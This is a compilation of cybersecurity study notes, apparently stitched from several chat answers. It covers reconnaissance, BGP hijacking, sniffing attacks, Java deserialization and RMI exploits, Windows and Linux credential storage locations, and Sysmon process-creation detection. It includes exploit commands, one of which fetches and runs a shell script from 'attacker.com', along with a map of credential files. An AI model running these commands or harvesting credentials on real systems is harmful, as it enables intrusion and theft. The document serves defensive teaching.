### **2. DNS Enumeration**  
- **Technique**:  
  - Querying DNS records (`A`, `MX`, `TXT`) to map subdomains (`admin.example.com`).  
  - Using tools like `nslookup`, `dig`, or [DNSDumpster](https://dnsdumpster.com/).  

### **3. SSL/TLS Certificate Analysis**  
- **Technique**:  
  - Extracting domain/hostnames from SSL certs (e.g., via [crt.sh](https://crt.sh/)).  

### **4. Search Engine Dorking**  
- **Technique**:  
  - Using Google/Bing operators:  
    - `site:example.com filetype:pdf` → Leaked documents.  
    - `intitle:"Login" example.com` → Exposed login portals.  

### **5. Metadata Harvesting**  
- **Technique**:  
  - Extracting hidden data from **PDFs, Word docs, images** (e.g., author names, software versions).  
  - Tools: `exiftool`, [Metagoofil](https://github.com/laramies/metagoofil).  

### **6. Network Traffic Sniffing (Unsecured Wi-Fi)**  
- **Technique**:  
  - Capturing unencrypted traffic (HTTP, FTP) in public networks.  

---

## **🛡️ Defense Strategies**  

### **1. Limit Public Data Exposure**  
- **WHOIS Privacy**: Use domain privacy services (e.g., Cloudflare, WhoisGuard).  
- **Employee Training**: Restrict sensitive posts on social media.  
- **GitHub Hygiene**: Scan repos for secrets with [GitGuardian](https://www.gitguardian.com/).  

### **2. Secure DNS & Subdomains**  
- **DNS Security**:  
  - Use **DNSSEC** to prevent spoofing.  
  - Regularly audit DNS records for leaks.  
- **Subdomain Monitoring**:  
  - Tools like [Detectify](https://detectify.com/) or [OWASP Amass](https://github.com/OWASP/Amass).  

### **3. Encrypt & Sanitize Metadata**  
- **SSL/TLS**: Enforce HTTPS (HSTS) to prevent sniffing.  
- **Metadata Removal**:  
  - Use tools like `exiftool -all= file.pdf` before sharing files.  

### **4. Search Engine Hardening**  
- **Robots.txt**: Block sensitive paths (e.g., `/admin/`).  
- **CAPTCHAs**: Rate-limit automated scraping.  

### **5. Network Protections**  
- **Wi-Fi**: Use VPNs/WPA3 on public networks.  
- **Email**: Disable auto-loading remote content (prevents tracking pixels).  

### **6. Threat Intelligence**  
- **Monitor Pastebin/Dark Web**: Use services like [Have I Been Pwned](https://haveibeenpwned.com/) or [DarkOwl](https://www.darkowl.com/).  

---

### **Border Gateway Protocol (BGP) Hijacking Attack**  

**BGP hijacking** is a cyberattack where malicious actors manipulate internet routing tables to redirect traffic through unauthorized networks. Since BGP (the protocol that routes traffic between autonomous systems (ASes) on the internet) relies on trust, attackers can exploit it to intercept, monitor, or disrupt data flows.

---

## **How BGP Hijacking Works**  
1. **Announcing False Routes**  
   - An attacker (or a compromised AS) falsely advertises ownership of IP prefixes they don’t actually control.  
   - Example: Claiming to be the best path for `192.0.2.0/24` even though they don’t own it.  

2. **Traffic Redirection**  
   - Neighboring routers update their routing tables, believing the attacker’s AS is the shortest path.  
   - Legitimate traffic gets rerouted through the attacker’s network.  

3. **Exploitation**  
   - **Interception** (Man-in-the-Middle attacks, snooping on unencrypted data).  
   - **Denial-of-Service (DoS)** (Blackholing traffic by dropping it).  
   - **Phishing/Spying** (Redirecting users to fake websites).  

---

## **Types of BGP Hijacking**  
1. **Prefix Hijacking**  
   - An AS announces someone else’s IP range (e.g., hijacking Google’s IP space).  

2. **Subprefix Hijacking**  
   - A more specific (smaller) route is advertised (e.g., `192.0.2.0/25` instead of `/24`), which takes priority.  

3. **AS Path Hijacking**  
   - Falsifying the AS path to make a route appear shorter and more desirable.  

4. **Route Leaks (Accidental Hijacking)**  
   - Misconfigured routers unintentionally propagate incorrect routes.  

---

## **Famous BGP Hijacking Attacks**  
- **2018: Amazon Route 53 Hijack**  
  - Attackers rerouted traffic meant for Amazon’s DNS service to steal cryptocurrency.  
- **2020: Russian ISP Hijacks Major Internet Routes**  
  - Rostelecom redirected traffic from Google, AWS, and others.  
- **2022: Chinese ISP Hijacks Western Traffic**  
  - China Telecom briefly rerouted European and U.S. internet traffic.  

---

## **How to Detect & Prevent BGP Hijacking**  
### **Detection**  
- **BGP Monitoring Tools** (e.g., BGPStream, RIPE Stat, Cloudflare Radar).  
- **Route Origin Authorization (ROA)** checks (via RPKI).  
- **Anomaly Detection** (sudden changes in AS paths).  

### **Prevention**  
1. **Resource Public Key Infrastructure (RPKI)**  
   - Cryptographically validates route announcements.  
2. **BGPsec** (BGP Security Extensions)  
   - Digitally signs BGP updates to prevent tampering.  
3. **Prefix Filtering**  
   - ISPs should filter invalid route announcements.  
4. **AS-SET & IRR Registrations**  
   - Properly register IP ranges in routing databases.  

---

## **Conclusion**  
BGP hijacking remains a critical threat due to BGP’s trust-based nature. While RPKI and BGPsec improve security, widespread adoption is still needed. Organizations should monitor BGP routes and implement filtering to reduce risks.  

---


Here’s a breakdown of **passive vs. active sniffing attacks**, along with details on **MAC Flooding, ARP Poisoning, SSL Stripping, and DNS Spoofing**:

---

## **1. Passive vs. Active Sniffing Attacks**
| **Type**       | **Description**                                                                 | **Detection Difficulty** | **Examples**                          |
|----------------|---------------------------------------------------------------------------------|--------------------------|---------------------------------------|
| **Passive**    | Silent interception of traffic without altering packets.                        | Hard to detect           | Eavesdropping on unencrypted Wi-Fi.   |
| **Active**     | Actively manipulates traffic (injects/modifies packets).                        | Easier to detect         | ARP Poisoning, DNS Spoofing.          |

---

## **2. MAC Flooding Attack (Active)**
### **How It Works**  
- Floods a switch’s **MAC address table** with fake MACs until it overflows.  
- Forces the switch into **"hub mode"**, broadcasting traffic to all ports (enabling sniffing).  

### **Impact**  
- Allows attackers to capture all traffic passing through the switch.  

### **Prevention**  
- **Port Security** (limit MACs per port).  
- **802.1X authentication**.  

---

## **3. ARP Poisoning (ARP Spoofing) (Active)**
### **How It Works**  
- Sends fake **ARP replies** to associate the attacker’s MAC with a legitimate IP (e.g., the router).  
- Redirects traffic through the attacker’s machine (**Man-in-the-Middle attack**).  

### **Impact**  
- Intercept/modify traffic (e.g., steal passwords, inject malware).  

### **Prevention**  
- **Static ARP entries** (but hard to scale).  
- **ARP monitoring tools** (e.g., Arpwatch).  
- **Encryption (HTTPS, VPNs)**.  

---

## **4. SSL Stripping (Active)**
### **How It Works**  
- Downgrades **HTTPS → HTTP** by intercepting and modifying requests.  
- Often combined with **ARP Poisoning or Evil Twin Wi-Fi attacks**.  

### **Impact**  
- Steals login credentials, session cookies.  

### **Prevention**  
- **HSTS (HTTP Strict Transport Security)**.  
- **Always check for HTTPS** (padlock icon).  

---

## **5. DNS Spoofing (DNS Cache Poisoning) (Active)**
### **How It Works**  
- Corrupts a DNS resolver’s cache with fake entries (e.g., `google.com → attacker’s IP`).  
- Victims are redirected to malicious sites.  

### **Impact**  
- Phishing, malware distribution.  

### **Prevention**  
- **DNSSEC (DNS Security Extensions)**.  
- **Use trusted DNS resolvers** (e.g., Cloudflare, Google DNS).  

---

## **Comparison Table**
| **Attack**         | **Layer**       | **Goal**                          | **Defense**                     |
|--------------------|----------------|-----------------------------------|----------------------------------|
| **MAC Flooding**   | Layer 2 (Data Link) | Disable switch security         | Port security, 802.1X           |
| **ARP Poisoning**  | Layer 2/3      | MITM, traffic interception       | Static ARP, encryption          |
| **SSL Stripping**  | Layer 7 (App)  | Downgrade HTTPS → HTTP           | HSTS, manual HTTPS verification |
| **DNS Spoofing**   | Layer 7 (App)  | Redirect to fake sites           | DNSSEC, secure DNS resolvers    |

---

### **Key Takeaways**  
- **Passive attacks** are stealthier (e.g., Wi-Fi sniffing).  
- **Active attacks** (ARP Poisoning, DNS Spoofing) manipulate traffic.  
- **Encryption (HTTPS, VPNs)** and **network hardening** (port security, DNSSEC) are critical defenses.  


Here’s a detailed breakdown of each attack, including how they work, real-world examples, and mitigation strategies:

---

### **1. Buffer Overflow Attack**
#### **What It Is**  
A memory corruption attack where an attacker writes more data into a buffer than it can hold, overwriting adjacent memory and potentially executing malicious code.

#### **How It Works**  
- **Stack-based overflow**: Overflows a fixed-size stack buffer, overwriting the return address to hijack execution.  
- **Heap-based overflow**: Corrupts dynamic memory structures to manipulate program behavior.  
- **Example**: The **Code Red worm (2001)** exploited a buffer overflow in IIS.  

#### **Exploitation Steps**  
1. Find a vulnerable function (e.g., `strcpy`, `gets`).  
2. Craft input to overwrite EIP (Instruction Pointer).  
3. Redirect execution to shellcode (e.g., `/bin/sh`).  

#### **Mitigation**  
- **Stack Canaries**: Detect stack corruption (e.g., `-fstack-protector` in GCC).  
- **DEP (Data Execution Prevention)**: Blocks code execution in non-executable memory.  
- **ASLR (Address Space Layout Randomization)**: Randomizes memory addresses.  

---

### **2. NetNTLM Hash Attack (Pass-the-Hash)**
#### **What It Is**  
An attack exploiting Windows’ NTLM authentication protocol to steal password hashes and impersonate users without cracking them.

#### **How It Works**  
- **Step 1**: Extract hashes from memory (e.g., Mimikatz) or SMB logs.  
- **Step 2**: Relay the hash to another machine (e.g., via **Responder** or **Impacket’s smbrelayx**).  
- **Example**: Lateral movement in Active Directory.  

#### **Mitigation**  
- **Enable SMB Signing**: Prevents relay attacks.  
- **Use Kerberos**: Prefers AES over NTLM.  
- **Restrict NTLM**: Via Group Policy (`Network security: Restrict NTLM`).  

---

### **3. Heartbleed (CVE-2014-0160)**
#### **What It Is**  
A vulnerability in OpenSSL’s TLS/DTLS heartbeat extension that leaks server memory (up to 64KB per request).

#### **How It Works**  
- **Malicious Heartbeat Request**: Sends a fake payload length (e.g., `65535`) to trick the server into returning private data.  
- **Leaked Data**: Private keys, session cookies, passwords.  

#### **Exploitation**  
```bash
openssl s_client -connect vuln-site:443 -tlsextdebug 2>&1 | grep "server extension"
```  
**Tool**: `Metasploit (auxiliary/scanner/ssl/openssl_heartbleed)`.  

#### **Mitigation**  
- **Patch OpenSSL** (v1.0.1g or later).  
- **Revoke compromised certificates**.  

---

### **4. Java RMI Registry Exploitation**
#### **What It Is**  
Abuse of Java Remote Method Invocation (RMI) to execute arbitrary code on misconfigured servers.

#### **How It Works**  
- **Step 1**: Find exposed RMI ports (default: `1099`).  
- **Step 2**: Exploit deserialization flaws (e.g., **ysoserial** with gadgets like `CommonsCollections`).  
- **Example**: **Apache JMX RMI exploits**.  

#### **Exploitation**  
```bash
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit target 1099 CommonsCollections5 "curl http://attacker.com/shell.sh | bash"
```  

#### **Mitigation**  
- **Disable RMI registry** if unused.  
- **Use JMX authentication**.  
- **Patch deserialization libraries**.  

---

### **5. DNS Amplification Attack (DDoS)**
#### **What It Is**  
A reflection-based DDoS attack using open DNS resolvers to flood a victim with large responses.

#### **How It Works**  
- **Step 1**: Spoof the victim’s IP as the source.  
- **Step 2**: Send small queries (e.g., `ANY` requests) to DNS resolvers.  
- **Amplification**: Responses are **50–100x larger** than requests.  

#### **Example**  
```plaintext
Attacker (1KB query) → Open DNS Resolver (50KB response) → Victim
```  

#### **Mitigation**  
- **Rate-limit DNS responses** (e.g., `iptables`).  
- **Disable open recursion** on DNS servers.  
- **Use BCP38** (anti-spoofing filters).  

---

### **6. Insecure Java Deserialization**
#### **What It Is**  
Exploiting unsafe deserialization of objects in Java apps to execute arbitrary code.

#### **How It Works**  
- **Step 1**: Find a deserialization endpoint (e.g., HTTP, RMI).  
- **Step 2**: Craft a malicious serialized object (e.g., using **ysoserial**).  
- **Gadget Chains**: Leverage libraries like `CommonsCollections`, `Groovy`, or `Jackson`.  

#### **Exploitation**  
```bash
java -jar ysoserial.jar CommonsCollections5 "id" > payload.bin
curl --data-binary @payload.bin http://vuln-app/deserialize
```  

#### **Mitigation**  
- **Use `ObjectInputFilter` (Java 9+)**.  
- **Replace Java serialization** with JSON/Protobuf.  
- **Patch libraries** (e.g., Apache Commons).  

---

### **Summary Table**
| **Attack**                     | **Target**          | **Key Tool**          | **Defense**                          |
|--------------------------------|---------------------|-----------------------|--------------------------------------|
| **Buffer Overflow**            | C/C++ apps          | GDB, Metasploit       | DEP/ASLR, bounds checking            |
| **NetNTLM Hash Attack**        | Windows AD          | Mimikatz, Responder   | SMB Signing, Kerberos                |
| **Heartbleed**                 | OpenSSL servers     | Metasploit, OpenSSL   | Patch OpenSSL                        |
| **Java RMI Exploit**           | Java RMI services   | ysoserial             | Disable RMI, JMX auth                |
| **DNS Amplification**          | DNS resolvers       | hping3, Scapy         | Rate limiting, BCP38                 |
| **Java Deserialization**       | Java web apps       | ysoserial, Burp Suite | `ObjectInputFilter`, JSON migration  |

---

### **Final Notes**  
- **Buffer overflows** and **deserialization** are code-level flaws.  
- **NetNTLM** and **Heartbleed** exploit protocol weaknesses.  
- **DNS amplification** is a network-layer DDoS tactic.  

Would you like a hands-on lab for any of these attacks?


---

files location where store credentials

These files are part of **Windows unattended installation** or **sysprep** configurations, often used for automated OS deployments. They may contain **credentials, product keys, or other sensitive information** if not properly cleaned after setup.  

### **Common Unattended/Sysprep Files & Risks**  
1. **`C:\sysprep\sysprep.xml`**  
   - Part of the **System Preparation Tool (sysprep)**.  
   - May store local admin credentials or domain join details.  

2. **`C:\sysprep\sysprep.inf`**  
   - Older configuration file (replaced by `.xml` in newer Windows versions).  
   - Can contain plaintext passwords if `AutoLogon` or `DomainJoin` settings are enabled.  

3. **`C:\sysprep.inf`**  
   - Alternate location for sysprep configuration (used in legacy setups).  

4. **`C:\unattend.xml`**  
   - **Unattended Windows Setup** file for automated installations.  
   - May include:  
     - Local user account passwords (sometimes base64-encoded).  
     - Domain-join credentials (`<DomainJoinData>`).  
     - Product keys (`<ProductKey>`).  

5. **`C:\Windows\Panther\Unattend.xml`**  
   - Default location for unattend files during Windows installation.  

6. **`C:\Windows\Panther\Unattend\Unattend.xml`**  
   - Alternate path used in some deployment scenarios.  

### **Why Are They Dangerous?**  
- **Credentials may be stored in plaintext or weakly encrypted** (e.g., base64).  
- Attackers use tools like **Metasploit (`post/windows/gather/enum_unattend`)** or manually search for these files.  
- Sysadmins often forget to delete them after deployment.  

The location where credentials are stored depends on the operating system and the type of credentials (e.g., system logins, application passwords, browser-stored credentials). Below are common locations for credential storage:

### **Windows**

1. **SAM (Security Account Manager) Database**
    
    - Location: `%SystemRoot%\system32\config\SAM`
        
    - Stores local user account credentials (hashed).
        
    - Requires SYSTEM privileges to access.
        
2. **LSASS (Local Security Authority Subsystem Service) Memory**
    
    - Stores logged-in users' credentials in memory.
        
    - Can be dumped using tools like Mimikatz.
        
3. **Credential Manager (Windows Vault)**
    
    - GUI: `Control Panel > User Accounts > Credential Manager`
        
    - Files:
        
        - `%AppData%\Microsoft\Credentials\`
            
        - `%LocalAppData%\Microsoft\Vault\`
            
4. **DPAPI (Data Protection API) Encrypted Files**
    
    - Used by browsers & apps to store passwords.
        
    - Locations:
        
        - Chrome: `%LocalAppData%\Google\Chrome\User Data\Default\Login Data`
            
        - Edge: `%LocalAppData%\Microsoft\Edge\User Data\Default\Login Data`
            
        - Other apps: `%AppData%\Microsoft\Protect\<SID>\`
            
5. **Cached Domain Credentials**
    
    - Location: `HKLM\SECURITY\Cache` (Registry)
        
    - Stores domain credentials when a domain-joined machine is offline.
        
6. **LSA Secrets (Registry)**
    
    - Location: `HKLM\SECURITY\Policy\Secrets\`
        
    - Stores service account passwords and other secrets.
        

---

### **Linux / Unix-like Systems**

1. **/etc/passwd & /etc/shadow**
    
    - `/etc/passwd` → User account info (no passwords in modern systems).
        
    - `/etc/shadow` → Hashed passwords (requires root access).
        
2. **~/.bash_history, ~/.zsh_history**
    
    - May contain plaintext passwords if accidentally entered in commands.
        
3. **SSH Keys**
    
    - `~/.ssh/id_rsa`, `~/.ssh/id_rsa.pub` (Private & Public keys).
        
    - `~/.ssh/known_hosts` (Stores trusted hosts).
        
4. **GNOME Keyring / KWallet**
    
    - `~/.local/share/keyrings/` (GNOME)
        
    - `~/.kde/share/apps/kwallet/` (KDE)
        
5. **Application-Specific Storage**
    
    - Firefox: `~/.mozilla/firefox/<profile>/logins.json` (encrypted)
        
    - Chrome/Chromium: `~/.config/google-chrome/Default/Login Data`
        
    - MySQL: `~/.my.cnf` (may contain credentials)
---

**Sysmon Event ID 1: Process Creation** is a critical log entry for **SOC analysts** as it records the creation of new processes on a Windows system. This event helps detect malicious activities like malware execution, lateral movement, and suspicious process behavior.

### **Key Fields in Event ID 1 (Process Creation)**
| Field | Description | SOC Analyst Relevance |
|--------|-------------|----------------------|
| **UtcTime** | Timestamp (UTC) | Timeline analysis |
| **ProcessGuid** | Unique process identifier | Tracking process lineage |
| **ProcessId** | Process ID (PID) | Cross-referencing with other logs |
| **Image** | Executable path (e.g., `C:\Windows\System32\cmd.exe`) | Detect unusual locations (e.g., `Temp`, `AppData`) |
| **CommandLine** | Full command used to launch the process | Detect obfuscation, suspicious arguments |
| **User** | User account executing the process | Privilege escalation detection |
| **ParentProcessGuid** | Parent process GUID | Identify process injection/spawning |
| **ParentImage** | Parent process executable (e.g., `explorer.exe`) | Detect living-off-the-land binaries (LOLBins) |
| **ParentCommandLine** | Command line of the parent process | Unusual parent-child relationships |

### **Why SOC Analysts Care About Event ID 1**
1. **Malware Detection**  
   - Unknown/unsigned executables running from `%AppData%`, `Temp`, or unusual directories.
   - Processes with random or misspelled names (`svch0st.exe` instead of `svchost.exe`).

2. **Lateral Movement & Persistence**  
   - `PsExec`, `WMI`, or `schtasks` spawning suspicious child processes.
   - Scheduled tasks or services launching malicious payloads.

3. **Command-Line Obfuscation**  
   - Base64-encoded commands (`powershell -enc SQBFAFgA...`).
   - Long, obfuscated PowerShell scripts.

4. **Living-Off-The-Land (LOLBins)**  
   - Legitimate tools (`msbuild.exe`, `regsvr32.exe`) executing malicious scripts.

5. **Parent-Process Anomalies**  
   - `explorer.exe` spawning `cmd.exe` (normal) vs. `word.exe` spawning `powershell.exe` (suspicious).

### **Example Detection Scenarios**
✅ **Suspicious Process from Temp Directory**  
```json
"Image": "C:\\Users\\Public\\Temp\\malware.exe"
```
✅ **PowerShell with Encoded Command**  
```json
"CommandLine": "powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAA=="
```
✅ **Unusual Parent-Child Relationship**  
```json
"ParentImage": "C:\\Windows\\System32\\msiexec.exe",
"Image": "C:\\Windows\\System32\\cmd.exe /c net user hacker P@ssw0rd /add"
```

### **How to Use in Investigations**
- **SIEM Correlation**: Combine with **Event ID 3 (Network Connection)** to track C2 communications.
- **Hunting**: Look for processes spawned by **Office apps, PDF readers, or browsers** (common exploit vectors).
- **Baselining**: Compare against known-good process trees.

### **Mitre ATT&CK Mapping**
- **T1059** (Command-Line Interface)  
- **T1053** (Scheduled Task Execution)  
- **T1106** (Execution via API)  

**Conclusion:** Event ID 1 is a goldmine for detecting malicious activity. SOC analysts should **filter for anomalies** in `Image`, `CommandLine`, and `ParentProcess` fields to uncover threats.
